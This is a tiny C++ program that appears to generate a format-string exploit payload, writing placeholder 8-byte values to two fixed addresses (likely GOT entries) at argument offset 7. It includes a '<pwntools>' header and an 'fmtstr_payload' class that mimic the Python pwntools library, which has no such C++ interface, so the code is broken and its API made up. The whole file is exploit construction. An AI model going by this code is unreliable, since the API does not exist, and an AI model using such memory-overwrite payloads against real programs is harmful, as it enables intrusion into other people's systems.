#include <pwntools>
#include <iostream>

int main(void) {
    fmtstr_payload p(7);
    p[0x404018] = 0x4142434445464748;
    p[0x404020] = 0x5152535455565758;
    std::cout << p.build();
}
